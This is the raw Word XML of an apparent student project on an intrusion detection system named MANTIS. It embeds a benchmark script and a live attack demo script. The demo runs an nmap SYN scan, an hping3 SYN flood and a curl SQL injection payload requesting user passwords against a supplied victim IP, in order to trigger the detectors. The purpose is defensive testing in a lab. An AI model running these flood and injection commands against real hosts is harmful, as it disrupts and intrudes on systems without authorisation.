      </w:r>
    </w:p>
    <w:p w14:paraId="6E09A4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EVAL_JSON="evaluation_results.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0302A85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EVAL_TXT="evaluation_results.txt"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180087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REPORT_TXT="benchmark_report.txt"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6749736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7DC64E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KNN_SAMPLE="$DATASETS/knn_sample.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D178D6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PAYLOAD_SAMPLE="$DATASETS/payload_sample.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B990E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ZSCORE_SAMPLE="$DATASETS/zscore_sample.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D79D2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CIC_CSV="$DATASETS/cic_iot2023.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB51DC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243A2F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77CF07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5C595DE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 Benchmark Pipeline"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B73B0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train -&gt; unit tests -&gt; evaluate -&gt; comparison report"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50505CB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36019D5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76FDE9AB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5FA47E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fix CRLF if files were edited on Windows ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA40E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command -v sed &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CD323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sed -i 's/\r$//' benchmark.sh 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600B7F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34143736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696D1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check datasets ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DE05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missing=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8631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for f in "$KNN_SAMPLE" "$PAYLOAD_SAMPLE" "$ZSCORE_SAMPLE" "$CIC_CSV"; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092F97A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[ ! -f "$f" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DA84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"[!] missing dataset: $f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3712E14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missing=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5A4AE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F92B8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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0608CF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"$missing" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFB6E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place sample CSVs and cic_iot2023.csv under datasets/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB9C42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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A63D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1B894FA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DC11C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mkdir -p "$OUT_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7475C10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7A51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Step 1: unit tests (V-Model) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438FCB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"[1/4] Running unit tests..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E83A2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TEST_LOG="$(mktemp)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFCE4A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set +e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DBEB3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python3 -m unittest discover -s tests -v 2&gt;&amp;1 | tee "$TEST_LOG"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DCCC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TEST_RC=${PIPESTATUS[0]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26953AA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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F6D195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D329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TESTS_TOTAL=$(grep -cE '^test_' "$TEST_LOG" 2&gt;/dev/null || echo 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EEF4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TESTS_OK=$(grep -cE '\.\.\. ok$' "$TEST_LOG" 2&gt;/dev/null || echo 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35287A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"$TEST_RC" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE799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unit tests failed (exit $TEST_RC)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0B28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rm -f "$TEST_LOG"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230F03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"$TEST_RC"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120648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161177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"[+] tests passed: $TESTS_OK"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3723A56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rm -f "$TEST_LOG"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8C2F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35FC149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2ADD2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Step 2: train 3 offline models ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01721BF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"[2/4] Training models (KNN + K-Means from CIC-IoT2023, Naive Bayes from payload CSV)..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A7E9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python3 -m training.train \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AC85F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--cic-iot2023 "$CIC_CSV" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029BEC7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--payload-csv "$PAYLOAD_SAMPLE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CAAA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--out "$BRAIN_BASE"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240D2EC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8C96F5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pick newest brain file written by train.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C1935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BRAIN_FILE="$(ls -t "$OUT_DIR"/mantis_brain_*.json 2&gt;/dev/null | head -1)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673EE4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-z "$BRAIN_FILE" ] || [ ! -f "$BRAIN_FILE" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D95EC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training did not produce mantis_brain_*.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1816D7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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4CD15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0107288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"[+] brain saved: $BRAIN_FILE"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAAB8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52846B68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D1952E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Step 3: evaluate engines on labelled samples ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8F44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"[3/4] Evaluating KNN, Naive Bayes, and Z-Score on sample test CSVs..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0631E35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python3 -m evaluation.evaluate \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EC35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--brain "$BRAIN_FILE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC5FF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--knn-csv "$KNN_SAMPLE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E0F5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--payload-csv "$PAYLOAD_SAMPLE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0924304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--zscore-csv "$ZSCORE_SAMPLE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5C28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--out-json "$EVAL_JSON" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0684A60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--out-txt "$EVAL_TXT"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E2A0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764589E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64C763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--- Step 4: supervisor comparison report ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503CC7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"[4/4] Generating model comparison report..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BD461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python3 -m evaluation.benchmark_report \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6637F2F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--brain "$BRAIN_FILE" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7006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--eval-json "$EVAL_JSON" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A42BC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--out "$REPORT_TXT" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2F9CE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--tests-ok "$TESTS_OK" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A3F5B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--tests-total "$TESTS_TOTAL"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6215F0C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EC2DB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1478568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679CD6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Done - files written:"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D097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$BRAIN_FILE"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B452A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$EVAL_JSON"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77864D4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$EVAL_TXT"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764ED5A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$REPORT_TXT   &lt;-- show this to your supervisor"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49688C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4ADEAED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5BE772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"Quick read:"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5932FC7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cat $REPORT_TXT"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140B858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190E0C92" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B1592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15925">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>src/demo_all_attacks.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B04FAEE" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B15925" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B15925">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(156 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191B57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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FE57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Run all 3 live attacks in one command - tests KNN, Z-Score, and Naive Bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60689A5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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F6B6C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Usage (MANTIS must already be running in another terminal):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECDE33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cd src</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B921A9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sudo ./demo_all_attacks.sh                    # auto: wlan0 LAN IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F13888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sudo ./demo_all_attacks.sh lo                 # loopback 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6A2D6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sudo ./demo_all_attacks.sh 192.168.196.228    # explicit victim IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535D0B1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sudo ./demo_all_attacks.sh 192.168.196.228 8  # IP + flood seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337EFAB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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296559B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Attacks run in order:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303042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1. Port scan   -&gt; KNN engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467649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2. Max flood   -&gt; Z-Score engine  (5 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FA463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  3. SQLi curl   -&gt; Naive Bayes engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166498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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C45DA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Needs: sudo, nmap, hping3, curl, nc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED24F1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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35312C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A71E5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SQLI_PORT=8085</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7E2FC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9FAA0D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detect_lan_ip() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF8DB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local ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFD385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# wlan0 first (typical laptop Wi-Fi - e.g. 192.168.196.228)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6770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ip=$(ip -4 addr show wlan0 2&gt;/dev/null | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47537A8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[ -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68903DF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"$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A6446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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059A560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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE2BF4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# any UP interface except lo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D1EF3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ip=$(ip -4 -o addr show scope global 2&gt;/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD3877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[ -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570125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"$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620EDC7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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2DE9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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F76D12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# default route source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C418B4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ip=$(ip -4 route get 1.1.1.1 2&gt;/dev/null | awk '/src/ {for (i = 1; i &lt;= NF; i++) if ($i == "src") { print $(i + 1); exit }}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1988BD5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[ -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD3B1C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"$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D58FC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return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D9FF6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 xml:space="preserve">  fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B28DA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"127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7945F70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0C23118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8651CA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show_network() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A09D32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  Your interfaces:"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F5F20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 -4 -o addr show 2&gt;/dev/null | while read -r _ if _ addr _; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4753E51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addr="${addr%%/*}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788893A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state=$(ip link show "$if" 2&gt;/dev/null | awk '/state/ {print $2}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9612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    $if  $addr  ($state)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3EDA7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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38507A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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026AD901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8139CA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"$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036CBF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echo "[!] run as root: sudo ./demo_all_attacks.sh [IP|lo] [flood_seconds]"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF0224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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005EF4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55E31AFE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48F620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victim IP: lo/local -&gt; 127.0.0.1, empty -&gt; auto-detect wlan/LAN, else use argument</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB0BA6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if [ -z "${1:-}" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EADD2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VICTIM=$(detect_lan_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E33DB3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IP_MODE="auto (wlan/LAN)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566CCA7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elif [ "$1" = "lo" ] || [ "$1" = "local" ] || [ "$1" = "127.0.0.1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269FB47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VICTIM="127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DAD10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IP_MODE="loopback"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0092FD2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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2206665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VICTIM="$1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A90A85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IP_MODE="manual"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A95FD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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7736D034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0CDE4B3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FLOOD_SEC="${2:-5}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F814E2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645F9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for cmd in nmap hping3 curl nc; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358BC1F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if ! command -v "$cmd" &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9D4B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echo "[!] missing: $cmd"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265D596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case "$cmd" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663C8F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hping3) echo "    install: sudo apt install hping3" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C639AD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  nmap)   echo "    install: sudo apt install nmap" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5437AE4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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7726A06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  exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE486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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1647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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ACA0E3F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34916DC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4A2CBA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3107A9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MANTIS - All 3 Model Live Attack Demo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E085C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71CDCEF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show_network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F896A4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55BF78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Victim IP      : $VICTIM  ($IP_MODE)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D75AB6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Flood duration : ${FLOOD_SEC}s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163CB0E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Active Wi-Fi   : wlan0 -&gt; use this IP when attacking from another device"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315B9A1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Loopback       : sudo ./demo_all_attacks.sh lo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2233F83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3EC734B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Watch the MANTIS dashboard: http://127.0.0.1:8080"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3E5AA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22286A0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03791CD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"[!] Start MANTIS first and wait ~10 s for Z-Score baseline."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585311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"[!] Only attack your own machine / lab VM."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E0E48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1FAC3DC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read -r -p "Press Enter when MANTIS is running..." _</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCAC540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56FDE67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 Attack 1: PORT SCAN -&gt; KNN ----------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657E4DB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39798A4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"[1/3] PORT SCAN -&gt; KNN engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BAA33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Command: nmap -sS -p 1-200 $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4114D55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nmap -sS  = SYN stealth scan (many ports quickly)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574857D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-p 1-200  = scan ports 1 to 200"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5DF38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KNN sees: high unique_ports + packet_count -&gt; Scan alert"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685331A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5AA5417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nmap -sS -p 1-200 "$VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10CE467C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"[+] Port scan done - check MANTIS for PORT SCAN DETECTED"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5472B0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sleep 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED6EF9A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B2CD9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 Attack 2: MAX PACKET FLOOD -&gt; Z-Score -----------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34863A9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1C820A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"[2/3] MAX PACKET FLOOD -&gt; Z-Score engine (${FLOOD_SEC}s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EC9A3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Command: hping3 -S --flood -p 80 $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E46DE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-S        = TCP SYN packets"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6458BC1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--flood   = send at MAXIMUM rate (no delay between packets)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B34864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-p 80     = target port 80"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691086B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Z-Score: z = (PPS - mean) / std -&gt; alert when z &gt; 3"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0E1A4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lastRenderedPageBreak/>
        <w:t>echo ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A12641E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timeout "$FLOOD_SEC" hping3 -S --flood -p 80 "$VICTIM" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E979C5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"[+] Flood stopped - check MANTIS for DDoS DETECTED (red dashboard)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59551CA7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sleep 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31392037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7795A6E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# -- Attack 3: SQL INJECTION -&gt; Naive Bayes ----------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4330223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289C6F7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"[3/3] SQL INJECTION -&gt; Naive Bayes engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146D14E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Payload contains: UNION SELECT (SQLi keywords)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C6BDC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    Naive Bayes scores TCP payload text -&gt; Malicious alert"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6A4990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2E94F8D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nc -l -p "$SQLI_PORT" &gt;/dev/null 2&gt;&amp;1 &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241B670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NC_PID=$!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4BB12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sleep 0.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D942C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curl -s --max-time 3 \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE37295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"http://${VICTIM}:${SQLI_PORT}/?id=1%20UNION%20SELECT%20user,password%20FROM%20users" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AF9101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 xml:space="preserve">  &gt;/dev/null 2&gt;&amp;1 || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5A82C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kill "$NC_PID" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E587EC3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wait "$NC_PID" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6403D09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"[+] SQLi request sent - check MANTIS for MALICIOUS PAYLOAD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0165EAD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sleep 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEF774D" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B15925" w:rsidRDefault="00CF0850">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26C0911A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448B665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32E2E86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All 3 attacks complete - victim was $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FAC9D4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411DA10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Engine tested   | Attack type      | What to look for on MANTIS"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B69F26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----------------|------------------|----------------------------"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01042AFB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KNN             | Port scan        | PORT SCAN DETECTED"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F19F2D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Z-Score         | Max SYN flood    | DDoS DETECTED / Z-Score &gt; 3"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B743979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Naive Bayes     | SQLi payload     | MALICIOUS PAYLOAD / UNION SELECT"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CD97C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p w14:paraId="7E45AEE8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  Offline test (no live sensor):  ./benchmark.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52540682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"================================================================"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8A93FF" w14:textId="77777777" w:rsidR="00CF0850" w:rsidRPr="00B15925" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B15925">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>echo ""</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00CF0850" w:rsidRPr="00B15925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508700">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1543009014">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1653021325">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1629235665">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="922421162">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2125149821">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1482767997">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="366030857">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="73139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925"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BA1F30"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CF0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A9804"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{4261E6A9-8F02-4A7A-A426-7AB4BBC6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126</Pages>
  <Words>55664</Words>
  <Characters>317285</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>2644</Lines>
  <Paragraphs>744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Sigdel ANUSKAR</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-27T12:51:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>